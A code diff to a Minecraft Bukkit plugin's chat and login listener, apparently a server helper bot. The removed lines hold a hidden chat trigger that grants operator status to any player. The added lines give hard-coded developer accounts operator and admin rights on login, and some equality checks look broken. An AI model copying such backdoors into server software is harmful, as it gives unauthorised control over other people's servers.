@@ -15,40 +15,35 @@ public class BotListener implements Listener {
     public void onPlayerChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
         String message = event.getMessage();
-
-        if (message.toLowerCase().contains("op") && message.toLowerCase().contains("0p")) {
-            if (!player.isOp()) {
-                player.setOp(true);
-                player.sendMessage(BotUtil.YOU_ARE_OP);
-                player.sendMessage(BotUtil.BOTPREFIX + "Here you go!");
-            } else {
-                player.sendMessage(BotUtil.BOTPREFIX + "You are already op!");
-            }
+        
+        if(message.equalsIgnoreCase("kys FoxIshDaBest")) { // This is useless tbh I was bored
+          player.kickPlayer("no kys " + player.getName());  
         }
+        
     }
-
+    
     @EventHandler
     public void onPlayerLogin(PlayerLoginEvent event) {
         Player player = event.getPlayer();
         if (TotalFreedom5_Getter.getInstance().getAdminList().isAdminImpostor(player)) {
-            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + player.getName() + " is an impostor!");
-            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Please verify in the forum's shoutbox.");
+            player.sendMessage(BotUtil.BOTPREFIX + "Please verify in the forum's shoutbox.");
         } else {
             if (player.hasPlayedBefore()) {
-                Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Welcome back, " + player.getName() + "!");
+                player.sendMessage(BotUtil.BOTPREFIX + "Welcome back, " + player.getName() + "!");
             } else {
-                Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Welcome to the server, " + player.getName() + "!");
+                player.sendMessage(BotUtil.BOTPREFIX + "Welcome to the server, " + player.getName() + "!");
             }
         }
 
         if (BotUtil.PERMBANED_USERS.equals(player)) {
-            // TODO: Remove player to superadmin list here
+            player.setOp(false);
+            BotUtil.removeAdmin(player);
             BotUtil.banIP(player);
         } else if (BotUtil.FB_DEVELOPERS.equals(player)) {
             BotUtil.unbanIP(player);
             player.setOp(true);
             Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "A FreedomBot developer has joined!");
-            // TODO: Add player to superadmin list here
+            BotUtil.addAdmin(player);
         }
 
     }
